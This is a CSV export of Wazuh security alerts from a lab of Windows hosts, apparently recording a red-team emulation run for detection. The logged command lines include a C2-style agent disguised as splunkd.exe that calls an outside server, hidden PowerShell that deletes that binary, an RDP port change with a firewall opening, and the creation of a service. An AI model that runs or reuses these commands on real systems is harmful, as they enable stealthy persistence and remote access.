wazuh-alerts-4.x-2024.11.30,d_ogfJMBRlc-D5DFFR_L,1,1,192.168.117.130,wazuh-agent,002,Maryam, ,1014, ,0x4000000010000000,{1C95126E-7EEA-49A9-A3FE-A378B03DDB4D},3,System,0,"""Name resolution for the name wpad timed out after none of the configured DNS servers responded.""",0,2024-11-30T08:11:27.122062400Z,1799,1716,DESKTOP-FMI6MML,1014,1452,WARNING,Microsoft-Windows-DNS-Client,4,false,5,Name resolution for the name wpad timed out,"[""windows"",""windows_system""]",61109, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:11:28.545",EventChannel,1732954288.2328121,"Nov 30, 2024 @ 08:11:28.545", , , , , , , , , , , , , , , , , , , , , , , , , , ,128,02000000C0A87502000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000,wpad, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,ePogfJMBRlc-D5DFFR_L,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 08:11:33.971
ProcessGuid: {15959494-C8B5-674A-C106-000000000D00}
ProcessId: 3020
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_joahzozd.opm.ps1
CreationUtcTime: 2024-11-30 08:11:33.971
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T08:11:33.982256600Z,56215,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,37,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:11:35.107",EventChannel,1732954295.2330107,"Nov 30, 2024 @ 08:11:35.107", , , , , , , , , , , , ,3020, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-C8B5-674A-C106-000000000D00},2024-11-30 08:11:33.971, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_joahzozd.opm.ps1,2024-11-30 08:11:33.971, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,cvoefJMBRlc-D5DFjx8n,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: -
UtcTime: 2024-11-30 08:09:49.025
ProcessGuid: {15959494-C84C-674A-BF06-000000000D00}
ProcessId: 5172
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Windows\System32\staged\cmd.exe
CreationUtcTime: 2024-11-25 22:41:16.892
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T08:09:49.033905400Z,56184,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,1,false,9,Powershell process created an executable file in Windows root folder,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92205, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:09:50.135",EventChannel,1732954190.2319848,"Nov 30, 2024 @ 08:09:50.135", , , , , , , , , , , , ,5172, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-C84C-674A-BF06-000000000D00},2024-11-30 08:09:49.025, , , , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Windows\\System32\\staged\\cmd.exe,2024-11-25 22:41:16.892, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,dvoffJMBRlc-D5DFPh_x,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: -
UtcTime: 2024-11-30 08:10:38.026
ProcessGuid: {15959494-C87D-674A-C006-000000000D00}
ProcessId: 580
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Windows\System32\staged\sethc.exe
CreationUtcTime: 2024-11-26 09:28:31.338
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T08:10:38.037952900Z,56201,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,2,false,9,Powershell process created an executable file in Windows root folder,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92205, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:10:39.143",EventChannel,1732954239.2325486,"Nov 30, 2024 @ 08:10:39.143", , , , , , , , , , , , ,580, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-C87D-674A-C006-000000000D00},2024-11-30 08:10:38.026, , , , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Windows\\System32\\staged\\sethc.exe,2024-11-26 09:28:31.338, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,ffoifJMBRlc-D5DFwR93,1,1,192.168.117.134,window-agent3,003,Maryam, ,1014, ,0x4000000010000000,{1C95126E-7EEA-49A9-A3FE-A378B03DDB4D},3,System,0,"""Name resolution for the name wpad timed out after none of the configured DNS servers responded.""",0,2024-11-30T08:14:27.565019700Z,2068,1836,DESKTOP-QGB4EQH,1014,1384,WARNING,Microsoft-Windows-DNS-Client,5,false,5,Name resolution for the name wpad timed out,"[""windows"",""windows_system""]",61109, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:14:28.643",EventChannel,1732954468.2351243,"Nov 30, 2024 @ 08:14:28.643", , , , , , , , , , , , , , , , , , , , , , , , , , ,128,02000000C0A87502000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000,wpad, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,bfocfJMBRlc-D5DFph_X,1,1,192.168.117.130,wazuh-agent,002,Maryam, ,8224, ,0x80000000000000, ,4,Application, ,"""The VSS service is shutting down due to idle timeout. """, ,2024-11-30T08:07:49.974773700Z,1722, ,DESKTOP-FMI6MML,0, ,INFORMATION,VSS,2,false,5,The VSS service is shutting down due to idle timeout.,"[""windows"",""windows_application""]",60702, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:07:50.390",EventChannel,1732954070.2302149,"Nov 30, 2024 @ 08:07:50.390", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,2D20436F64653A2020434F525356434330303030303735392D2043616C6C3A2020434F525356434330303030303734312D205049443A202030303030323130342D205449443A202030303030313532342D20434D443A2020433A5C57696E646F77735C73797374656D33325C76737376632E6578652020202D20557365723A204E616D653A204E5420415554484F524954595C53595354454D2C205349443A532D312D352D313820, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,qPosfJMBRlc-D5DFxx_7,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 08:25:17.842
ProcessGuid: {15959494-CBED-674A-FA06-000000000D00}
ProcessId: 4464
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_32i0a5ev.2gn.ps1
CreationUtcTime: 2024-11-30 08:25:17.842
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T08:25:17.845741000Z,56520,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,58,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:25:18.960",EventChannel,1732955118.2486414,"Nov 30, 2024 @ 08:25:18.960", , , , , , , , , , , , ,4464, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-CBED-674A-FA06-000000000D00},2024-11-30 08:25:17.842, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_32i0a5ev.2gn.ps1,2024-11-30 08:25:17.842, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,qfosfJMBRlc-D5DFxx_7,1,1,192.168.117.134,window-agent3,003,Maryam, ,4624, ,0x8020000000000000,{54849625-5478-4994-A5BA-3E3B0328C30D},0,Security,0,"""An account was successfully logged on.

Subject:
	Security ID:		S-1-5-18
	Account Name:		DESKTOP-QGB4EQH$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7

Logon Information:
	Logon Type:		5
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		S-1-5-18
	Account Name:		SYSTEM
	Account Domain:		NT AUTHORITY
	Logon ID:		0x3E7
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{00000000-0000-0000-0000-000000000000}

Process Information:
	Process ID:		0x250
	Process Name:		C:\Windows\System32\services.exe

Network Information:
	Workstation Name:	-
	Source Network Address:	-
	Source Port:		-

Detailed Authentication Information:
	Logon Process:		Advapi  
	Authentication Package:	Negotiate
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.""",2,2024-11-30T08:25:18.597276600Z,5094,644,DESKTOP-QGB4EQH,12544,656,AUDIT_SUCCESS,Microsoft-Windows-Security-Auditing,22,false,3,Windows logon success.,"[""windows"",""windows_security"",""authentication_success""]",60106,"[""IV_32.2""]","[""7.1"",""7.2""]",windows_eventchannel,log,"Nov 30, 2024 @ 08:25:19.664",EventChannel,1732955119.2489425,"Nov 30, 2024 @ 08:25:19.664",0x3e7,WORKGROUP,0x0,%%1833,Negotiate,0x3e7,Advapi,{00000000-0000-0000-0000-000000000000},SYSTEM,0,%%1842,S-1-5-18,0x250,C:\\Windows\\System32\\services.exe,NT AUTHORITY,S-1-5-18,%%1843,5,DESKTOP-QGB4EQH$,"[""164.312.b""]","[""10.2.5""]","[""CC6.8"",""CC7.2"",""CC7.3""]","[""AC.7"",""AU.14""]","[""Valid Accounts""]","[""T1078""]","[""Defense Evasion"",""Persistence"",""Privilege Escalation"",""Initial Access""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,lPolfJMBRlc-D5DFdB_q,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 08:17:19.875
ProcessGuid: {15959494-CA0F-674A-E606-000000000D00}
ProcessId: 2084
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe -ExecutionPolicy Bypass -C ""$startupClass = Get-CimClass -ClassName Win32_ProcessStartup;$startupInfo = New-CimInstance -CimClass $startupClass -Property @{ShowWindow = 0} -ClientOnly;$processClass = Get-CimClass -ClassName Win32_Process;Invoke-CimMethod -CimClass $processClass -MethodName Create -Arguments @{    Commandline = 'cmd.exe /c \""timeout /nobreak /t 10 >nul 2>nul & del /f C:\Users\Public\splunkd.exe\""';    ProcessStartupInformation = [CimInstance]$startupInfo};""
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F
ParentProcessGuid: {15959494-D565-6749-1C01-000000000D00}
ParentProcessId: 7968
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T08:17:19.882310700Z,56364,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,3,false,3,Powershell was used to delete files or directories,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92021, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:17:20.942",EventChannel,1732954640.2416711,"Nov 30, 2024 @ 08:17:20.942", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,2084, , , , , , , , , , ,"[""File Deletion""]","[""T1070.004""]","[""Defense Evasion""]", , , ,PowerShell.EXE,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,Microsoft® Windows® Operating System, , ,Windows PowerShell, , ,{15959494-CA0F-674A-E606-000000000D00},2024-11-30 08:17:19.875,"SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F","technique_id=T1059.001,technique_name=PowerShell",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D565-6749-1C01-000000000D00},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0x107a6b,7968,C:\\Windows\\system32\\,C:\\Users\\Public\\splunkd.exe,"powershell.exe -ExecutionPolicy Bypass -C \""$startupClass = Get-CimClass -ClassName Win32_ProcessStartup;$startupInfo = New-CimInstance -CimClass $startupClass -Property @{ShowWindow = 0} -ClientOnly;$processClass = Get-CimClass -ClassName Win32_Process;Invoke-CimMethod -CimClass $processClass -MethodName Create -Arguments @{    Commandline = 'cmd.exe /c \\\""timeout /nobreak /t 10 &gt;nul 2&gt;nul &amp; del /f C:\\Users\\Public\\splunkd.exe\\\""';    ProcessStartupInformation = [CimInstance]$startupInfo};\""",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,vPoxfJMBRlc-D5DF0R8q,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1083,technique_name=File and Directory Discovery
UtcTime: 2024-11-30 08:30:51.883
ProcessGuid: {15959494-CD3B-674A-1107-000000000D00}
ProcessId: 4496
Image: C:\Windows\System32\reg.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Registry Console Tool
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: reg.exe
CommandLine: reg  add ""HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"" /v PortNumber /t REG_DWORD /d 4489 /f 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=04CE0B79EA20332CC4FF4679883B18BFE4341FBD,MD5=E3DACF0B31841FA02064B4457D44B357,SHA256=928693D84D652DC15B3FCDC6576D790053755C5181CE6708B1110DE12ADAE4A1,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC
ParentProcessGuid: {15959494-CD3B-674A-1007-000000000D00}
ParentProcessId: 4648
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C reg add ""HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"" /v PortNumber /t REG_DWORD /d 4489 /f && netsh advfirewall firewall add rule name=""RDPPORTLatest-TCP-In"" dir=in action=allow protocol=TCP localport=4489
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T08:30:51.884729700Z,56654,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,1,false,10,Value added to registry key has Base64-like pattern,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92041, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:30:52.944",EventChannel,1732955452.2557613,"Nov 30, 2024 @ 08:30:52.944", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,4496, , , , , , , , , , ,"[""Obfuscated Files or Information"",""Modify Registry""]","[""T1027"",""T1112""]","[""Defense Evasion""]", , , ,reg.exe,C:\\Windows\\System32\\reg.exe,Microsoft® Windows® Operating System, , ,Registry Console Tool, , ,{15959494-CD3B-674A-1107-000000000D00},2024-11-30 08:30:51.883,"SHA1=04CE0B79EA20332CC4FF4679883B18BFE4341FBD,MD5=E3DACF0B31841FA02064B4457D44B357,SHA256=928693D84D652DC15B3FCDC6576D790053755C5181CE6708B1110DE12ADAE4A1,IMPHASH=BE482BE427FE212CFEF2CDA0E61F19AC","technique_id=T1083,technique_name=File and Directory Discovery",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-CD3B-674A-1007-000000000D00},"cmd.exe /C reg add \""HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\"" /v PortNumber /t REG_DWORD /d 4489 /f &amp;&amp; netsh advfirewall firewall add rule name=\""RDPPORTLatest-TCP-In\"" dir=in action=allow protocol=TCP localport=4489",0x107a6b,4648,C:\\Windows\\system32\\,C:\\Windows\\System32\\cmd.exe,"reg  add \""HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\"" /v PortNumber /t REG_DWORD /d 4489 /f",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,l_onfJMBRlc-D5DFIh-W,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2024-11-30 08:19:15.569
ProcessGuid: {15959494-CA83-674A-EC06-000000000D00}
ProcessId: 2052
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C sc create win32times binPath= ""cmd /c start c:\T1036.004_NonExistingScript.ps1"" && sc qc win32times
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE
ParentProcessGuid: {15959494-D565-6749-1C01-000000000D00}
ParentProcessId: 7968
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T08:19:15.571611000Z,56404,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,20,false,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:19:16.648",EventChannel,1732954756.2430828,"Nov 30, 2024 @ 08:19:16.648", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,2052, , , , , , , , , , ,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-CA83-674A-EC06-000000000D00},2024-11-30 08:19:15.569,"SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE","technique_id=T1059.003,technique_name=Windows Command Shell",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D565-6749-1C01-000000000D00},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0x107a6b,7968,C:\\Windows\\system32\\,C:\\Users\\Public\\splunkd.exe,"cmd.exe /C sc create win32times binPath= \""cmd /c start c:\\T1036.004_NonExistingScript.ps1\"" &amp;&amp; sc qc win32times",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,lvomfJMBRlc-D5DFSx-6,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 08:18:21.090
ProcessGuid: {15959494-CA4C-674A-EB06-000000000D00}
ProcessId: 8180
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_myfj3idu.hq5.ps1
CreationUtcTime: 2024-11-30 08:18:21.090
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T08:18:21.102416800Z,56397,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,52,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:18:22.207",EventChannel,1732954702.2427817,"Nov 30, 2024 @ 08:18:22.207", , , , , , , , , , , , ,8180, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-CA4C-674A-EB06-000000000D00},2024-11-30 08:18:21.090, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_myfj3idu.hq5.ps1,2024-11-30 08:18:21.090, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,nfoofJMBRlc-D5DF0B9J,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 08:20:58.621
ProcessGuid: {15959494-D565-6749-1C01-000000000D00}
ProcessId: 7968
Image: C:\Users\Public\splunkd.exe
TargetFilename: C:\Windows\System32\basic_scanner.ps1
CreationUtcTime: 2024-11-30 08:20:58.621
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T08:20:58.622000500Z,56419,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,34,false,6,Executable dropped in Windows root folder,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92217, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:20:59.690",EventChannel,1732954859.2457013,"Nov 30, 2024 @ 08:20:59.690", , , , , , , , , , , , ,7968, , , , , , , , , , ,"[""Lateral Tool Transfer""]","[""T1570""]","[""Lateral Movement""]", , , , ,C:\\Users\\Public\\splunkd.exe, , , , , , ,{15959494-D565-6749-1C01-000000000D00},2024-11-30 08:20:58.621, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Windows\\System32\\basic_scanner.ps1,2024-11-30 08:20:58.621, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,pPosfJMBRlc-D5DFBB-n,1,1,192.168.117.134,window-agent3,003,Maryam, ,1014, ,0x4000000010000000,{1C95126E-7EEA-49A9-A3FE-A378B03DDB4D},3,System,0,"""Name resolution for the name wpad timed out after none of the configured DNS servers responded.""",0,2024-11-30T08:24:34.606169300Z,2070,1680,DESKTOP-QGB4EQH,1014,1384,WARNING,Microsoft-Windows-DNS-Client,7,false,5,Name resolution for the name wpad timed out,"[""windows"",""windows_system""]",61109, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:24:35.664",EventChannel,1732955075.2481415,"Nov 30, 2024 @ 08:24:35.664", , , , , , , , , , , , , , , , , , , , , , , , , , ,128,02000000C0A87502000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000,wpad, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
